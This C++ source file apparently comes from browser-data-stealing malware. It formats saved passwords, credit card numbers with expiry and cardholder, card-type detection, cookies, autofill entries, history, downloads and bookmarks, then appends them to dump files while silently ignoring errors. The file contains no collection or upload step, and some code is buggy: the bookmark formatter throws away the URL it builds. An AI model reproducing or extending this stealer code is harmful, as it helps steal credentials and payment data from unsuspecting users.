#include "BrowserUtils.h"
#include "Banking.h"
#include <locale>
#include <codecvt>
#include <string>
#include <Windows.h>

// Function to format a Password object into a human-readable string
std::string BrowserUtils::FormatPassword(Password pPassword)
{
    // Concatenate details from the Password object into a formatted string
    std::string PasStr = "WebSite: " + pPassword.Website + "\r\n" // Website name
        + "Hostname: " + pPassword.LoginUrl + "\r\n" // Login URL
        + "Username: " + pPassword.Username + "\r\n" // Username
        + "Password: " + pPassword.Pass + "\r\n\r\n"; // Password

    return PasStr; // Return the formatted string
}

// Function to format a CreditCard object into a human-readable string
std::string BrowserUtils::FormatCreditCard(CreditCard cCard)
{
    // Generate a string with card details, including the type detected by a helper function
    std::string CardStr = Banking::DetectCreditCardType(cCard.Number) + "\r\n" // Card type (e.g., Visa, MasterCard)
        + "Number: " + cCard.Number + "\r\n" // Credit card number
        + "Exp: " + cCard.ExpMonth + "/" + cCard.ExpYear + "\r\n" // Expiry date
        + "Holder: " + cCard.Name + "\r\n\r\n"; // Cardholder's name

    return CardStr; // Return the formatted string
}

// Function to format a Cookie object into a human-readable string
std::string BrowserUtils::FormatCookie(Cookie cCookie)
{
    // Concatenate cookie details into a string
    std::string CookieStr = "HostKey: " + cCookie.HostKey + "\r\n" // Cookie host key
        + "Path: " + cCookie.Path + "\r\n" // Path for the cookie
        + "ExpiresUtc: " + cCookie.ExpiresUtc + "\r\n" // Expiration date in UTC
        + "Name: " + cCookie.Name + "\r\n" // Cookie name
        + "Value: " + cCookie.encrypted_value + "\r\n\r\n"; // Encrypted cookie value

    return CookieStr; // Return the formatted string
}

// Function to format an AutoFill object into a human-readable string
std::string BrowserUtils::FormatAutoFill(AutoFill aFill)
{
    // Concatenate autofill details into a string
    std::string AutoStr = aFill.Name + "\r\n" // Name of the autofill field
        + aFill.Value + "\t\r\n"; // Value associated with the field

    return AutoStr; // Return the formatted string
}

// Function to format a Site (history entry) object into a human-readable string
std::string BrowserUtils::FormatHistory(Site sSite)
{
    // Convert the site's title from wide string to a UTF-8 encoded string using MultiByteToWideChar
    int len = WideCharToMultiByte(CP_UTF8, 0, sSite.Title.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string Title(len, 0);
    WideCharToMultiByte(CP_UTF8, 0, sSite.Title.c_str(), -1, &Title[0], len, nullptr, nullptr);

    // Concatenate history details into a string
    std::string SiteStr = "Title: " + Title + "\r\n" // Site title
        + "Url: " + sSite.Url + "\r\n" // Site URL
        + "Count: " + std::to_string(sSite.Count) + "\r\n\r\n"; // Visit count

    return SiteStr; // Return the formatted string
}

//std::string BrowserUtils::FormatHistory(Site sSite)
//{
//    // Convert the site's title from wide string to a UTF-8 encoded string
//    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
//    std::string Title = converter.to_bytes(sSite.Title); // Convert wide string to standard string
//
//    // Concatenate history details into a string
//    std::string SiteStr = "Title: " + Title + "\r\n" // Site title
//        + "Url: " + sSite.Url + "\r\n" // Site URL
//        + "Count: " + std::to_string(sSite.Count) + "\r\n\r\n"; // Visit count
//
//    return SiteStr; // Return the formatted string
//}

// Function to format a Download object into a human-readable string
std::string BrowserUtils::FormatDownload(Download download)
{
    // Concatenate download details into a string
    std::string SiteStr = "DownloadURL: " + download.Tag_Url + "\r\n" // Download URL
        + "DownloadFile: " + download.Target_Path + "\r\n\r\n"; // File path

    return SiteStr; // Return the formatted string
}

// Function to format a Bookmark object into a human-readable string
std::string BrowserUtils::FormatBookmark(Bookmark bBookmark)
{
    if (!bBookmark.Url.empty()) // Check if the bookmark URL is not empty
    {
        // Concatenate bookmark details into a string if URL exists
        std::string BookmarkStr = "### " + bBookmark.Title + " ### " + bBookmark.Url + "\r\n";
    }

    // Return the formatted string with only the title if URL is empty
    return "### " + bBookmark.Title + " ###\r\n";
}

// Function to write a list of cookies to a file
void BrowserUtils::WriteCookies(std::vector<Cookie> cCookies, std::string& sFile)
{
    try
    {
        // Open the file in append mode
        std::ofstream outFile(sFile, std::ios::app);
        if (!outFile.is_open()) // Check if the file failed to open
        {
            std::cerr << "Failed to open file" << std::endl; // Print error
            return;
        }

        // Write each formatted cookie to the file
        for (auto& cCookie : cCookies)
        {
            outFile << FormatCookie(cCookie);
        }

        outFile.close(); // Close the file
    }
    catch (const std::exception&) // Catch exceptions silently
    {

    }
}

// Function to write a list of autofill entries to a file
void BrowserUtils::WriteAutoFill(std::vector<AutoFill>& aFills, std::string& sFile)
{
    try
    {
        // Open the file in append mode
        std::ofstream outFile(sFile, std::ios::app);
        if (!outFile.is_open()) // Check if the file failed to open
        {
            std::cerr << "Failed to open file." << std::endl; // Print error
            return;
        }

        // Write each formatted autofill entry to the file
        for (auto& file : aFills)
        {
            outFile << FormatAutoFill(file);
        }
    }
    catch (const std::exception&) // Catch exceptions silently
    {

    }
}

// Function to write a list of history entries to a file
void BrowserUtils::WriteHistory(std::vector<Site>& sHistory, std::string& sFile)
{
    try
    {
        // Open the specified file in append mode
        std::ofstream outFile(sFile, std::ios::app);
        if (!outFile.is_open()) // Check if the file failed to open
        {
            std::cerr << "Failed to open file" << std::endl; // Print an error message
            return; // Exit the function
        }

        // Iterate over the history entries
        for (const auto& history : sHistory)
        {
            // Format each history entry and write it to the file
            outFile << FormatHistory(history);
        }
    }
    catch (const std::exception&) // Catch and handle exceptions silently
    {
    }
}

// Function to write a list of downloads to a file
void BrowserUtils::WriteDownload(std::vector<Download>& sDownload, std::string& sFile)
{
    try
    {
        // Open the specified file in append mode
        std::ofstream outFile(sFile, std::ios::app);
        if (!outFile.is_open()) // Check if the file failed to open
        {
            std::cerr << "Failed to open file" << std::endl; // Print an error message
            return; // Exit the function
        }

        // Iterate over the download entries
        for (const auto& download : sDownload)
        {
            // Format each download entry and write it to the file
            outFile << FormatDownload(download);
        }
    }
    catch (const std::exception&) // Catch and handle exceptions silently
    {
    }
}

// Function to write a list of bookmarks to a file
void BrowserUtils::WriteBookmarks(std::vector<Bookmark>& bBookmarks, std::string& sFile)
{
    try
    {
        // Open the specified file in append mode
        std::ofstream outFile(sFile, std::ios::app);
        if (!outFile.is_open()) // Check if the file failed to open
        {
            std::cerr << "Failed to open file" << std::endl; // Print an error message
            return; // Exit the function
        }

        // Iterate over the bookmark entries
        for (auto& bookmars : bBookmarks)
        {
            // Format each bookmark entry and write it to the file
            outFile << FormatBookmark(bookmars);
        }
    }
    catch (const std::exception&) // Catch and handle exceptions silently
    {
    }
}

// Function to write a list of passwords to a file
void BrowserUtils::WritePasswords(std::vector<Password> pPasswords, std::string& sFile)
{
    try
    {
        // Open the specified file in append mode
        std::ofstream outFile(sFile, std::ios::app);
        if (!outFile.is_open()) // Check if the file failed to open
        {
            std::cerr << "Failed to open file" << std::endl; // Print an error message
            return; // Exit the function
        }

        // Iterate over the password entries
        for (auto& password : pPasswords)
        {
            // Skip passwords with both an empty username and login URL
            if (password.Username.empty() && password.LoginUrl.empty())
            {
                continue; // Skip to the next password entry
            }

            // Format each password entry and write it to the file
            outFile << FormatPassword(password);
        }
    }
    catch (const std::exception&) // Catch and handle exceptions silently
    {
    }
}

// Function to write a list of credit cards to a file
void BrowserUtils::WriteCreditCards(std::vector<CreditCard>& cCReditCard, std::string sFile)
{
    try
    {
        // Open the specified file in append mode
        std::ofstream outFile(sFile, std::ios::app);
        if (!outFile.is_open()) // Check if the file failed to open
        {
            std::cerr << "Failed to open file." << std::endl; // Print an error message
            return; // Exit the function
        }

        // Iterate over the credit card entries
        for (auto& reditcard : cCReditCard)
        {
            // Format each credit card entry and write it to the file
            outFile << FormatCreditCard(reditcard);
        }
    }
    catch (const std::exception&) // Catch and handle exceptions silently
    {
    }
}


